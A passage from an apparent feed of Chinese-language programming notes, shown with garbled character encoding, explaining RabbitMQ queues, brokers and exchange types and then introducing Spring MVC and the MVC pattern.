<p><strong>Queue(æ¶ˆæ¯é˜Ÿåˆ—)</strong> ç”¨æ¥ä¿å­˜æ¶ˆæ¯ç›´åˆ°å‘é€ç»™æ¶ˆè´¹è€…ã€‚å®ƒæ˜¯æ¶ˆæ¯çš„å®¹å™¨ï¼Œä¹Ÿæ˜¯æ¶ˆæ¯çš„ç»ˆç‚¹ã€‚ä¸€ä¸ªæ¶ˆæ¯å¯æŠ•å…¥ä¸€ä¸ªæˆ–å¤šä¸ªé˜Ÿåˆ—ã€‚æ¶ˆæ¯ä¸€ç›´åœ¨é˜Ÿåˆ—é‡Œé¢ï¼Œç­‰å¾…æ¶ˆè´¹è€…è¿æ¥åˆ°è¿™ä¸ªé˜Ÿåˆ—å°†å…¶å–èµ°ã€‚</p>
<p><strong>RabbitMQ</strong> ä¸­æ¶ˆæ¯åªèƒ½å­˜å‚¨åœ¨ <strong>é˜Ÿåˆ—</strong> ä¸­ï¼Œè¿™ä¸€ç‚¹å’Œ <strong>Kafka</strong> è¿™ç§æ¶ˆæ¯ä¸­é—´ä»¶ç›¸åã€‚Kafka å°†æ¶ˆæ¯å­˜å‚¨åœ¨ <strong>topicï¼ˆä¸»é¢˜ï¼‰</strong> è¿™ä¸ªé€»è¾‘å±‚é¢ï¼Œè€Œç›¸å¯¹åº”çš„é˜Ÿåˆ—é€»è¾‘åªæ˜¯topicå®é™…å­˜å‚¨æ–‡ä»¶ä¸­çš„ä½ç§»æ ‡è¯†ã€‚ RabbitMQ çš„ç”Ÿäº§è€…ç”Ÿäº§æ¶ˆæ¯å¹¶æœ€ç»ˆæŠ•é€’åˆ°é˜Ÿåˆ—ä¸­ï¼Œæ¶ˆè´¹è€…å¯ä»¥ä»é˜Ÿåˆ—ä¸­è·å–æ¶ˆæ¯å¹¶æ¶ˆè´¹ã€‚</p>
<p><strong>å¤šä¸ªæ¶ˆè´¹è€…å¯ä»¥è®¢é˜…åŒä¸€ä¸ªé˜Ÿåˆ—</strong>ï¼Œè¿™æ—¶é˜Ÿåˆ—ä¸­çš„æ¶ˆæ¯ä¼šè¢«å¹³å‡åˆ†æ‘Šï¼ˆRound-Robinï¼Œå³è½®è¯¢ï¼‰ç»™å¤šä¸ªæ¶ˆè´¹è€…è¿›è¡Œå¤„ç†ï¼Œè€Œä¸æ˜¯æ¯ä¸ªæ¶ˆè´¹è€…éƒ½æ”¶åˆ°æ‰€æœ‰çš„æ¶ˆæ¯å¹¶å¤„ç†ï¼Œè¿™æ ·é¿å…çš„æ¶ˆæ¯è¢«é‡å¤æ¶ˆè´¹ã€‚</p>
<p><strong>RabbitMQ</strong> ä¸æ”¯æŒé˜Ÿåˆ—å±‚é¢çš„å¹¿æ’­æ¶ˆè´¹,å¦‚æœæœ‰å¹¿æ’­æ¶ˆè´¹çš„éœ€æ±‚ï¼Œéœ€è¦åœ¨å…¶ä¸Šè¿›è¡ŒäºŒæ¬¡å¼€å‘,è¿™æ ·ä¼šå¾ˆéº»çƒ¦ï¼Œä¸å»ºè®®è¿™æ ·åšã€‚</p>
<h3 id="broker-æ¶ˆæ¯ä¸­é—´ä»¶çš„æœåŠ¡èŠ‚ç‚¹" tabindex="-1"> Brokerï¼ˆæ¶ˆæ¯ä¸­é—´ä»¶çš„æœåŠ¡èŠ‚ç‚¹ï¼‰</h3>
<p>å¯¹äº RabbitMQ æ¥è¯´ï¼Œä¸€ä¸ª RabbitMQ Broker å¯ä»¥ç®€å•åœ°çœ‹ä½œä¸€ä¸ª RabbitMQ æœåŠ¡èŠ‚ç‚¹ï¼Œæˆ–è€…RabbitMQæœåŠ¡å®ä¾‹ã€‚å¤§å¤šæ•°æƒ…å†µä¸‹ä¹Ÿå¯ä»¥å°†ä¸€ä¸ª RabbitMQ Broker çœ‹ä½œä¸€å° RabbitMQ æœåŠ¡å™¨ã€‚</p>
<p>ä¸‹å›¾å±•ç¤ºäº†ç”Ÿäº§è€…å°†æ¶ˆæ¯å­˜å…¥ RabbitMQ Broker,ä»¥åŠæ¶ˆè´¹è€…ä»Brokerä¸­æ¶ˆè´¹æ•°æ®çš„æ•´ä¸ªæµç¨‹ã€‚</p>
<p><img src="@source/assets/cs-note/framework/message-queue/RabbitMQ-Broker.png" alt="æ¶ˆæ¯é˜Ÿåˆ—çš„è¿è½¬è¿‡ç¨‹" loading="lazy"></p>
<p>è¿™æ ·å›¾1ä¸­çš„ä¸€äº›å…³äº RabbitMQ çš„åŸºæœ¬æ¦‚å¿µæˆ‘ä»¬å°±ä»‹ç»å®Œæ¯•äº†ï¼Œä¸‹é¢å†æ¥ä»‹ç»ä¸€ä¸‹ <strong>Exchange Types(äº¤æ¢å™¨ç±»å‹)</strong> ã€‚</p>
<h3 id="exchange-types-äº¤æ¢å™¨ç±»å‹" tabindex="-1"> Exchange Types(äº¤æ¢å™¨ç±»å‹)</h3>
<p>RabbitMQ å¸¸ç”¨çš„ Exchange Type æœ‰ <strong>fanout</strong>ã€<strong>direct</strong>ã€<strong>topic</strong>ã€<strong>headers</strong> è¿™å››ç§ï¼ˆAMQPè§„èŒƒé‡Œè¿˜æåˆ°ä¸¤ç§ Exchange Typeï¼Œåˆ†åˆ«ä¸º system ä¸ è‡ªå®šä¹‰ï¼Œè¿™é‡Œä¸äºˆä»¥æè¿°ï¼‰ã€‚</p>
<h4 id="_1-fanout" tabindex="-1"> â‘  fanout</h4>
<p>fanout ç±»å‹çš„Exchangeè·¯ç”±è§„åˆ™éå¸¸ç®€å•ï¼Œå®ƒä¼šæŠŠæ‰€æœ‰å‘é€åˆ°è¯¥Exchangeçš„æ¶ˆæ¯è·¯ç”±åˆ°æ‰€æœ‰ä¸å®ƒç»‘å®šçš„Queueä¸­ï¼Œä¸éœ€è¦åšä»»ä½•åˆ¤æ–­æ“ä½œï¼Œæ‰€ä»¥ fanout ç±»å‹æ˜¯æ‰€æœ‰çš„äº¤æ¢æœºç±»å‹é‡Œé¢é€Ÿåº¦æœ€å¿«çš„ã€‚fanout ç±»å‹å¸¸ç”¨æ¥å¹¿æ’­æ¶ˆæ¯ã€‚</p>
<h4 id="_2-direct" tabindex="-1"> â‘¡ direct</h4>
<p>direct ç±»å‹çš„Exchangeè·¯ç”±è§„åˆ™ä¹Ÿå¾ˆç®€å•ï¼Œå®ƒä¼šæŠŠæ¶ˆæ¯è·¯ç”±åˆ°é‚£äº› Bindingkey ä¸ RoutingKey å®Œå…¨åŒ¹é…çš„ Queue ä¸­ã€‚</p>
<p><img src="@source/assets/cs-note/framework/message-queue/RabbitMQ-direct.png" alt="direct ç±»å‹äº¤æ¢å™¨" loading="lazy"></p>
<p>ä»¥ä¸Šå›¾ä¸ºä¾‹ï¼Œå¦‚æœå‘é€æ¶ˆæ¯çš„æ—¶å€™è®¾ç½®è·¯ç”±é”®ä¸ºâ€œwarningâ€,é‚£ä¹ˆæ¶ˆæ¯ä¼šè·¯ç”±åˆ° Queue1 å’Œ Queue2ã€‚å¦‚æœåœ¨å‘é€æ¶ˆæ¯çš„æ—¶å€™è®¾ç½®è·¯ç”±é”®ä¸º&quot;Infoâ€æˆ–è€…&quot;debugâ€ï¼Œæ¶ˆæ¯åªä¼šè·¯ç”±åˆ°Queue2ã€‚å¦‚æœä»¥å…¶ä»–çš„è·¯ç”±é”®å‘é€æ¶ˆæ¯ï¼Œåˆ™æ¶ˆæ¯ä¸ä¼šè·¯ç”±åˆ°è¿™ä¸¤ä¸ªé˜Ÿåˆ—ä¸­ã€‚</p>
<p>direct ç±»å‹å¸¸ç”¨åœ¨å¤„ç†æœ‰ä¼˜å…ˆçº§çš„ä»»åŠ¡ï¼Œæ ¹æ®ä»»åŠ¡çš„ä¼˜å…ˆçº§æŠŠæ¶ˆæ¯å‘é€åˆ°å¯¹åº”çš„é˜Ÿåˆ—ï¼Œè¿™æ ·å¯ä»¥æŒ‡æ´¾æ›´å¤šçš„èµ„æºå»å¤„ç†é«˜ä¼˜å…ˆçº§çš„é˜Ÿåˆ—ã€‚</p>
<h4 id="_3-topic" tabindex="-1"> â‘¢ topic</h4>
<p>å‰é¢è®²åˆ°directç±»å‹çš„äº¤æ¢å™¨è·¯ç”±è§„åˆ™æ˜¯å®Œå…¨åŒ¹é… BindingKey å’Œ RoutingKey ï¼Œä½†æ˜¯è¿™ç§ä¸¥æ ¼çš„åŒ¹é…æ–¹å¼åœ¨å¾ˆå¤šæƒ…å†µä¸‹ä¸èƒ½æ»¡è¶³å®é™…ä¸šåŠ¡çš„éœ€æ±‚ã€‚topicç±»å‹çš„äº¤æ¢å™¨åœ¨åŒ¹é…è§„åˆ™ä¸Šè¿›è¡Œäº†æ‰©å±•ï¼Œå®ƒä¸ direct ç±»å‹çš„äº¤æ¢å™¨ç›¸ä¼¼ï¼Œä¹Ÿæ˜¯å°†æ¶ˆæ¯è·¯ç”±åˆ° BindingKey å’Œ RoutingKey ç›¸åŒ¹é…çš„é˜Ÿåˆ—ä¸­ï¼Œä½†è¿™é‡Œçš„åŒ¹é…è§„åˆ™æœ‰äº›ä¸åŒï¼Œå®ƒçº¦å®šï¼š</p>
<ul>
<li>RoutingKey ä¸ºä¸€ä¸ªç‚¹å·â€œï¼â€åˆ†éš”çš„å­—ç¬¦ä¸²ï¼ˆè¢«ç‚¹å·â€œï¼â€åˆ†éš”å¼€çš„æ¯ä¸€æ®µç‹¬ç«‹çš„å­—ç¬¦ä¸²ç§°ä¸ºä¸€ä¸ªå•è¯ï¼‰ï¼Œå¦‚ â€œcom.rabbitmq.clientâ€ã€â€œjava.util.concurrentâ€ã€â€œcom.hidden.clientâ€;</li>
<li>BindingKey å’Œ RoutingKey ä¸€æ ·ä¹Ÿæ˜¯ç‚¹å·â€œï¼â€åˆ†éš”çš„å­—ç¬¦ä¸²ï¼›</li>
<li>BindingKey ä¸­å¯ä»¥å­˜åœ¨ä¸¤ç§ç‰¹æ®Šå­—ç¬¦ä¸²â€œ<em>â€å’Œâ€œ#â€ï¼Œç”¨äºåšæ¨¡ç³ŠåŒ¹é…ï¼Œå…¶ä¸­â€œ</em>â€ç”¨äºåŒ¹é…ä¸€ä¸ªå•è¯ï¼Œâ€œ#â€ç”¨äºåŒ¹é…å¤šä¸ªå•è¯(å¯ä»¥æ˜¯é›¶ä¸ª)ã€‚</li>
</ul>
<p><img src="@source/assets/cs-note/framework/message-queue/RabbitMQ-topic.png" alt="topic ç±»å‹äº¤æ¢å™¨" loading="lazy"></p>
<p>ä»¥ä¸Šå›¾ä¸ºä¾‹ï¼š</p>
<ul>
<li>è·¯ç”±é”®ä¸º â€œcom.rabbitmq.clientâ€ çš„æ¶ˆæ¯ä¼šåŒæ—¶è·¯ç”±åˆ° Queuel å’Œ Queue2;</li>
<li>è·¯ç”±é”®ä¸º â€œcom.hidden.clientâ€ çš„æ¶ˆæ¯åªä¼šè·¯ç”±åˆ° Queue2 ä¸­ï¼›</li>
<li>è·¯ç”±é”®ä¸º â€œcom.hidden.demoâ€ çš„æ¶ˆæ¯åªä¼šè·¯ç”±åˆ° Queue2 ä¸­ï¼›</li>
<li>è·¯ç”±é”®ä¸º â€œjava.rabbitmq.demoâ€ çš„æ¶ˆæ¯åªä¼šè·¯ç”±åˆ°Queuelä¸­ï¼›</li>
<li>è·¯ç”±é”®ä¸º â€œjava.util.concurrentâ€ çš„æ¶ˆæ¯å°†ä¼šè¢«ä¸¢å¼ƒæˆ–è€…è¿”å›ç»™ç”Ÿäº§è€…ï¼ˆéœ€è¦è®¾ç½® mandatory å‚æ•°ï¼‰ï¼Œå› ä¸ºå®ƒæ²¡æœ‰åŒ¹é…ä»»ä½•è·¯ç”±é”®ã€‚</li>
</ul>
<h4 id="_4-headers-ä¸æ¨è" tabindex="-1"> â‘£ headers(ä¸æ¨è)</h4>
<p>headers ç±»å‹çš„äº¤æ¢å™¨ä¸ä¾èµ–äºè·¯ç”±é”®çš„åŒ¹é…è§„åˆ™æ¥è·¯ç”±æ¶ˆæ¯ï¼Œè€Œæ˜¯æ ¹æ®å‘é€çš„æ¶ˆæ¯å†…å®¹ä¸­çš„ headers å±æ€§è¿›è¡ŒåŒ¹é…ã€‚åœ¨ç»‘å®šé˜Ÿåˆ—å’Œäº¤æ¢å™¨æ—¶åˆ¶å®šä¸€ç»„é”®å€¼å¯¹ï¼Œå½“å‘é€æ¶ˆæ¯åˆ°äº¤æ¢å™¨æ—¶ï¼ŒRabbitMQä¼šè·å–åˆ°è¯¥æ¶ˆæ¯çš„ headersï¼ˆä¹Ÿæ˜¯ä¸€ä¸ªé”®å€¼å¯¹çš„å½¢å¼)'å¯¹æ¯”å…¶ä¸­çš„é”®å€¼å¯¹æ˜¯å¦å®Œå…¨åŒ¹é…é˜Ÿåˆ—å’Œäº¤æ¢å™¨ç»‘å®šæ—¶æŒ‡å®šçš„é”®å€¼å¯¹ï¼Œå¦‚æœå®Œå…¨åŒ¹é…åˆ™æ¶ˆæ¯ä¼šè·¯ç”±åˆ°è¯¥é˜Ÿåˆ—ï¼Œå¦åˆ™ä¸ä¼šè·¯ç”±åˆ°è¯¥é˜Ÿåˆ—ã€‚headers ç±»å‹çš„äº¤æ¢å™¨æ€§èƒ½ä¼šå¾ˆå·®ï¼Œè€Œä¸”ä¹Ÿä¸å®ç”¨ï¼ŒåŸºæœ¬ä¸Šä¸ä¼šçœ‹åˆ°å®ƒçš„å­˜åœ¨ã€‚</p>
<h1 id="rabbitmq-ä½¿ç”¨" tabindex="-1"> RabbitMQ ä½¿ç”¨</h1>
]]></content>
    <published>2022-05-16T04:59:52.000Z</published>
  </entry>
  <entry>
    <title type="html">Spring MVC ä»‹ç»</title>
    <id>https://vuepress-theme-hope-v2-demo.mrhope.site/cs-way/notes/%E6%A1%86%E6%9E%B6/Spring-MVC.html</id>
    <link href="https://vuepress-theme-hope-v2-demo.mrhope.site/cs-way/notes/%E6%A1%86%E6%9E%B6/Spring-MVC.html"/>
    <updated>2022-05-16T04:59:52.000Z</updated>
    <content type="html"><![CDATA[ 
<ul>
<li>
<ul>
<li>
<ul>
<li></li>
<li></li>
</ul>
</li>
<li>
<ul>
<li></li>
<li></li>
</ul>
</li>
</ul>
</li>
<li>
<ul>
<li>
<ul>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
</ul>
</li>
<li>
<ul>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
</ul>
</li>
</ul>
</li>
<li></li>
</ul>
 
<h1 id="spring-mvc-ä»‹ç»" tabindex="-1"> Spring MVC ä»‹ç»</h1>
<p>Spring Web MVCæ˜¯ä¸€ç§åŸºäºJavaçš„å®ç°äº†Web MVCè®¾è®¡æ¨¡å¼çš„è¯·æ±‚é©±åŠ¨ç±»å‹çš„è½»é‡çº§Webæ¡†æ¶ï¼Œå³ä½¿ç”¨äº†MVCæ¶æ„æ¨¡å¼çš„æ€æƒ³ï¼Œå°†webå±‚è¿›è¡ŒèŒè´£è§£è€¦ï¼ŒåŸºäºè¯·æ±‚é©±åŠ¨æŒ‡çš„å°±æ˜¯ä½¿ç”¨è¯·æ±‚-å“åº”æ¨¡å‹ã€‚</p>
<h2 id="mvcæ¨¡å¼" tabindex="-1"> MVCæ¨¡å¼</h2>
<p><strong>MVC</strong>(Model View Controller)æ˜¯ä¸€ç§è½¯ä»¶è®¾è®¡çš„æ¡†æ¶æ¨¡å¼ï¼Œå®ƒé‡‡ç”¨æ¨¡å‹(<strong>Model</strong>)-è§†å›¾(<strong>View</strong>)-æ§åˆ¶å™¨(<strong>Controller</strong>)çš„æ–¹æ³•æŠŠä¸šåŠ¡é€»è¾‘ã€æ•°æ®ä¸ç•Œé¢æ˜¾ç¤ºåˆ†ç¦»ã€‚MVCçš„ç†å¿µå°±æ˜¯æŠŠæ•°æ®å¤„ç†ã€æ•°æ®å±•ç¤º(ç•Œé¢)å’Œç¨‹åº/ç”¨æˆ·çš„äº¤äº’ä¸‰è€…åˆ†ç¦»å¼€çš„ä¸€ç§ç¼–ç¨‹æ¨¡å¼ã€‚</p>
<p>MVCæ¡†æ¶æ¨¡å¼æ˜¯ä¸€ç§å¤åˆæ¨¡å¼ï¼ŒMVCçš„ä¸‰ä¸ªæ ¸å¿ƒéƒ¨ä»¶åˆ†åˆ«æ˜¯</p>
<ul>
<li>Model(æ¨¡å‹)ï¼šæ‰€æœ‰çš„ç”¨æˆ·æ•°æ®ã€çŠ¶æ€ä»¥åŠç¨‹åºé€»è¾‘ï¼Œç‹¬ç«‹äºè§†å›¾å’Œæ§åˆ¶å™¨</li>
<li>View(è§†å›¾)ï¼šå‘ˆç°æ¨¡å‹ï¼Œç±»ä¼¼äºWebç¨‹åºä¸­çš„ç•Œé¢ï¼Œè§†å›¾ä¼šä»æ¨¡å‹ä¸­æ‹¿åˆ°éœ€è¦å±•ç°çš„çŠ¶æ€ä»¥åŠæ•°æ®ï¼Œå¯¹äºç›¸åŒçš„æ•°æ®å¯ä»¥æœ‰å¤šç§ä¸åŒçš„æ˜¾ç¤ºå½¢å¼(è§†å›¾)</li>
<li>Controller(æ§åˆ¶å™¨)ï¼šè´Ÿè´£è·å–ç”¨æˆ·çš„è¾“å…¥ä¿¡æ¯ï¼Œè¿›è¡Œè§£æå¹¶åé¦ˆç»™æ¨¡å‹ï¼Œé€šå¸¸æƒ…å†µä¸‹ä¸€ä¸ªè§†å›¾å…·æœ‰ä¸€ä¸ªæ§åˆ¶å™¨</li>
</ul>
<h3 id="mvcçš„å¥½å¤„" tabindex="-1"> MVCçš„å¥½å¤„</h3>
<p>ç¨‹åºé€šè¿‡å°†M(Model)å’ŒV(View)çš„ä»£ç åˆ†ç¦»ï¼Œå®ç°äº†å‰åç«¯ä»£ç çš„åˆ†ç¦»</p>
<ul>
<li>å¯ä»¥ä½¿åŒä¸€ä¸ªç¨‹åºä½¿ç”¨ä¸åŒçš„è¡¨ç°å½¢å¼ï¼Œå¦‚æœæ§åˆ¶å™¨åé¦ˆç»™æ¨¡å‹çš„æ•°æ®å‘ç”Ÿäº†å˜åŒ–ï¼Œé‚£ä¹ˆæ¨¡å‹å°†åŠæ—¶é€šçŸ¥æœ‰å…³çš„è§†å›¾ï¼Œè§†å›¾ä¼šå¯¹åº”çš„åˆ·æ–°è‡ªå·±æ‰€å±•ç°çš„å†…å®¹</li>
<li>æ¨¡å‹æ˜¯ç‹¬ç«‹äºè§†å›¾çš„ï¼Œæ‰€ä»¥æ¨¡å‹å¯å¤ç”¨ï¼Œæ¨¡å‹å¯ä»¥ç‹¬ç«‹çš„ç§»æ¤åˆ°åˆ«çš„åœ°æ–¹ç»§ç»­ä½¿ç”¨</li>
<li>å‰åç«¯çš„ä»£ç åˆ†ç¦»ï¼Œä½¿é¡¹ç›®å¼€å‘çš„åˆ†å·¥æ›´åŠ æ˜ç¡®ï¼Œç¨‹åºçš„æµ‹è¯•æ›´åŠ ç®€ä¾¿ï¼Œæé«˜å¼€å‘æ•ˆç‡</li>
</ul>
<h3 id="mvcæ¨¡å¼åœ¨webä¸­åº”ç”¨" tabindex="-1"> MVCæ¨¡å¼åœ¨Webä¸­åº”ç”¨</h3>
<p><strong>MVCæ¡†æ¶æ¨¡å¼åœ¨B/Sä¸‹çš„åº”ç”¨</strong></p>
<ul>
<li>Vï¼šViewè§†å›¾ï¼ŒWebç¨‹åºä¸­æŒ‡ç”¨æˆ·å¯ä»¥çœ‹åˆ°çš„å¹¶å¯ä»¥ä¸ä¹‹è¿›è¡Œæ•°æ®äº¤äº’çš„ç•Œé¢ï¼Œæ¯”å¦‚ä¸€ä¸ªhtmlç½‘é¡µç•Œé¢ï¼ŒMVCå¯ä»¥ä¸ºç¨‹åºå¤„ç†å¾ˆå¤šä¸åŒçš„è§†å›¾ï¼Œç”¨æˆ·åœ¨è§†å›¾ä¸­è¿›è¡Œè¾“å‡ºæ•°æ®ä»¥åŠä¸€ç³»åˆ—æ“ä½œï¼Œæ³¨æ„ï¼šè§†å›¾ä¸­ä¸ä¼šå‘ç”Ÿæ•°æ®çš„å¤„ç†æ“ä½œ</li>
<li>Mï¼šModelæ¨¡å‹ï¼šè¿›è¡Œæ‰€æœ‰æ•°æ®çš„å¤„ç†å·¥ä½œï¼Œæ¨¡å‹è¿”å›çš„æ•°æ®æ˜¯ä¸­ç«‹çš„ï¼Œå’Œæ•°æ®æ ¼å¼æ— å…³ï¼Œä¸€ä¸ªæ¨¡å‹å¯ä»¥ä¸ºå¤šä¸ªè§†å›¾æ¥æä¾›æ•°æ®ï¼Œæ‰€ä»¥æ¨¡å‹çš„ä»£ç é‡å¤æ€§æ¯”è¾ƒä½</li>
<li>Cï¼šControlleræ§åˆ¶å™¨ï¼šè´Ÿè´£æ¥å—ç”¨æˆ·çš„è¾“å…¥ï¼Œå¹¶ä¸”è°ƒç”¨æ¨¡å‹å’Œè§†å›¾å»å®Œæˆç”¨æˆ·çš„éœ€æ±‚ï¼Œæ§åˆ¶å™¨ä¸ä¼šè¾“å‡ºä¹Ÿä¸ä¼šåšå‡ºä»»ä½•å¤„ç†ï¼Œåªä¼šæ¥å—è¯·æ±‚å¹¶è°ƒç”¨æ¨¡å‹æ„ä»¶å»å¤„ç†ç”¨æˆ·çš„è¯·æ±‚ï¼Œç„¶ååœ¨ç¡®å®šç”¨å“ªä¸ªè§†å›¾å»æ˜¾ç¤ºè¿”å›çš„æ•°æ®</li>
</ul>
<div align="center">
<p><img src="@source/assets/cs-note/framework/spring/springmvc-mvc.gif" alt="" title=":size=600" loading="lazy"></p>
</div>
<ol>
<li>æµè§ˆå™¨å‘é€è¯·æ±‚åˆ°æ§åˆ¶å™¨;</li>
<li>æ§åˆ¶å™¨ä¸èƒ½å¤„ç†è¯·æ±‚å¿…é¡»ç»™æ¨¡å‹å±‚æ¥å¤„ç†æ¥ç€å»è®¿é—®æ•°æ®åº“</li>
<li>æ¨¡å‹å±‚å°†å¤„ç†å¥½çš„ç»“æœè¿”å›ç»™æ§åˆ¶å±‚</li>
<li>æ§åˆ¶å±‚å°†é€»è¾‘è§†å›¾å“åº”ç»™æµè§ˆå™¨.</li>
</ol>
<p>MVCçš„æœ¬è´¨ : MVCçš„æ ¸å¿ƒæ€æƒ³æ˜¯ä¸šåŠ¡æ•°æ®æŠ½å–,åŒç‰©ä¸šæ•°æ®å‘ˆç°åˆ†ç¦»;æœ‰åˆ©äºç¨‹åºç®€åŒ–,æ–¹ä¾¿ç¼–ç¨‹</p>
<p><strong>MVCåœ¨Webä¸­çš„ä¼˜ç‚¹</strong></p>
<ul>
<li>è€¦åˆæ€§ä½ï¼šè§†å›¾(é¡µé¢)å’Œä¸šåŠ¡å±‚(æ•°æ®å¤„ç†)åˆ†ç¦»ï¼Œä¸€ä¸ªåº”ç”¨çš„ä¸šåŠ¡æµç¨‹æˆ–è€…ä¸šåŠ¡è§„åˆ™çš„æ”¹å˜åªéœ€è¦æ”¹åŠ¨MVCä¸­çš„æ¨¡å‹å³å¯ï¼Œä¸ä¼šå½±å“åˆ°æ§åˆ¶å™¨ä¸è§†å›¾</li>
<li>éƒ¨ç½²å¿«ï¼Œæˆæœ¬ä½ï¼šMVCä½¿å¼€å‘å’Œç»´æŠ¤ç”¨æˆ·æ¥å£çš„æŠ€æœ¯å«é‡é™ä½ã€‚ä½¿ç”¨MVCæ¨¡å¼ä½¿å¼€å‘æ—¶é—´å¾—åˆ°ç›¸å½“å¤§çš„ç¼©å‡ï¼Œå®ƒä½¿ç¨‹åºå‘˜ï¼ˆJavaå¼€å‘äººå‘˜ï¼‰é›†ä¸­ç²¾åŠ›äºä¸šåŠ¡é€»è¾‘ï¼Œç•Œé¢ç¨‹åºå‘˜ï¼ˆHTMLå’ŒJSPå¼€å‘äººå‘˜ï¼‰é›†ä¸­ç²¾åŠ›äºè¡¨ç°å½¢å¼ä¸Š</li>
<li>å¯ç»´æŠ¤æ€§é«˜ï¼šåˆ†ç¦»è§†å›¾å±‚å’Œä¸šåŠ¡é€»è¾‘å±‚ä¹Ÿä½¿å¾—WEBåº”ç”¨æ›´æ˜“äºç»´æŠ¤å’Œä¿®æ”¹</li>
</ul>
<p><strong>MVCåœ¨Webä¸­çš„ç¼ºç‚¹</strong></p>
<ul>
<li>è°ƒè¯•å›°éš¾ï¼šå› ä¸ºæ¨¡å‹å’Œè§†å›¾è¦ä¸¥æ ¼çš„åˆ†ç¦»ï¼Œè¿™æ ·ä¹Ÿç»™è°ƒè¯•åº”ç”¨ç¨‹åºå¸¦æ¥äº†ä¸€å®šçš„å›°éš¾ï¼Œæ¯ä¸ªæ„ä»¶åœ¨ä½¿ç”¨ä¹‹å‰éƒ½éœ€è¦ç»è¿‡å½»åº•çš„æµ‹è¯•</li>
<li>ä¸é€‚åˆå°å‹ï¼Œä¸­ç­‰è§„æ¨¡çš„åº”ç”¨ç¨‹åºï¼šåœ¨ä¸€ä¸ªä¸­å°å‹çš„åº”ç”¨ç¨‹åºä¸­ï¼Œå¼ºåˆ¶æ€§çš„ä½¿ç”¨MVCè¿›è¡Œå¼€å‘ï¼Œå¾€å¾€ä¼šèŠ±è´¹å¤§é‡æ—¶é—´ï¼Œå¹¶ä¸”ä¸èƒ½ä½“ç°MVCçš„ä¼˜åŠ¿ï¼ŒåŒæ—¶ä¼šä½¿å¼€å‘å˜å¾—ç¹ç</li>
<li>å¢åŠ ç³»ç»Ÿç»“æ„å’Œå®ç°çš„å¤æ‚æ€§ï¼šå¯¹äºç®€å•çš„ç•Œé¢ï¼Œä¸¥æ ¼éµå¾ªMVCï¼Œä½¿æ¨¡å‹ã€è§†å›¾ä¸æ§åˆ¶å™¨åˆ†ç¦»ï¼Œä¼šå¢åŠ ç»“æ„çš„å¤æ‚æ€§ï¼Œå¹¶å¯èƒ½äº§ç”Ÿè¿‡å¤šçš„æ›´æ–°æ“ä½œï¼Œé™ä½è¿è¡Œæ•ˆç‡</li>
<li>è§†å›¾ä¸æ§åˆ¶å™¨é—´çš„è¿‡äºç´§å¯†çš„è¿æ¥å¹¶ä¸”é™ä½äº†è§†å›¾å¯¹æ¨¡å‹æ•°æ®çš„è®¿é—®ï¼šè§†å›¾ä¸æ§åˆ¶å™¨æ˜¯ç›¸äº’åˆ†ç¦»ï¼Œä½†å´æ˜¯è”ç³»ç´§å¯†çš„éƒ¨ä»¶ï¼Œè§†å›¾æ²¡æœ‰æ§åˆ¶å™¨çš„å­˜åœ¨ï¼Œå…¶åº”ç”¨æ˜¯å¾ˆæœ‰é™çš„ï¼Œåä¹‹äº¦ç„¶ï¼Œè¿™æ ·å°±å¦¨ç¢äº†ä»–ä»¬çš„ç‹¬ç«‹é‡ç”¨ã€‚ä¾æ®æ¨¡å‹æ“ä½œæ¥å£çš„ä¸åŒï¼Œè§†å›¾å¯èƒ½éœ€è¦å¤šæ¬¡è°ƒç”¨æ‰èƒ½è·å¾—è¶³å¤Ÿçš„æ˜¾ç¤ºæ•°æ®ã€‚å¯¹æœªå˜åŒ–æ•°æ®çš„ä¸å¿…è¦çš„é¢‘ç¹è®¿é—®ï¼Œä¹Ÿå°†æŸå®³æ“ä½œæ€§èƒ½</li>
</ul>
<h2 id="spring-mvc" tabindex="-1"> Spring MVC</h2>
<p>Spring MVCé‡‡ç”¨äº†æ¾æ•£è€¦åˆçš„å¯æ’æ‹”ç»„ä»¶ç»“æ„ï¼Œæ¯”å…¶ä»–çš„MVCæ¡†æ¶æ›´å…·æœ‰çµæ´»æ€§å’Œæ‰©å±•æ€§ï¼ŒSpring MVCé€šè¿‡ä½¿ç”¨ä¸€å¥—æ³¨è§£ï¼Œä½¿ä¸€ä¸ªJavaç±»æˆä¸ºå‰ç«¯æ§åˆ¶å™¨(Controller)ï¼Œä¸éœ€è¦å®ç°ä»»ä½•æ¥å£ï¼ŒåŒæ—¶ï¼ŒSpring MVCæ”¯æŒRESTå½¢å¼çš„URLè¯·æ±‚ï¼Œé™¤æ­¤ä¹‹å¤–ï¼ŒSpring MVCåœ¨åœ¨æ•°æ®ç»‘å®šã€è§†å›¾è§£æã€æœ¬åœ°åŒ–å¤„ç†åŠé™æ€èµ„æºå¤„ç†ä¸Šéƒ½æœ‰è®¸å¤šä¸ä¿—çš„è¡¨ç°ã€‚</p>
<h3 id="springmvc-ç‰¹ç‚¹" tabindex="-1"> SpringMVC ç‰¹ç‚¹</h3>
<ol>
<li>æ¸…æ™°çš„è§’è‰²åˆ’åˆ†ï¼š
<ul>
<li>å‰ç«¯æ§åˆ¶å™¨ï¼ˆDispatcherServletï¼‰</li>
<li>è¯·æ±‚åˆ°å¤„ç†å™¨æ˜ å°„ï¼ˆHandlerMappingï¼‰</li>
<li>å¤„ç†å™¨é€‚é…å™¨ï¼ˆHandlerAdapterï¼‰</li>
<li>è§†å›¾è§£æå™¨ï¼ˆViewResolverï¼‰</li>
<li>å¤„ç†å™¨æˆ–é¡µé¢æ§åˆ¶å™¨ï¼ˆControllerï¼‰</li>
<li>éªŒè¯å™¨ï¼ˆ Validatorï¼‰</li>
<li>è¡¨å•å¯¹è±¡ï¼ˆForm Object æä¾›ç»™è¡¨å•å±•ç¤ºå’Œæäº¤åˆ°çš„å¯¹è±¡å°±å«è¡¨å•å¯¹è±¡ï¼‰</li>
</ul>
</li>
<li>ç”±äºå‘½ä»¤å¯¹è±¡å°±æ˜¯ä¸€ä¸ªPOJOï¼Œæ— éœ€ç»§æ‰¿æ¡†æ¶ç‰¹å®šAPIï¼Œå¯ä»¥ä½¿ç”¨å‘½ä»¤å¯¹è±¡ç›´æ¥ä½œä¸ºä¸šåŠ¡å¯¹è±¡ï¼›</li>
<li>å’ŒSpring å…¶ä»–æ¡†æ¶æ— ç¼é›†æˆï¼Œæ˜¯å…¶å®ƒWebæ¡†æ¶æ‰€ä¸å…·å¤‡çš„ï¼›</li>
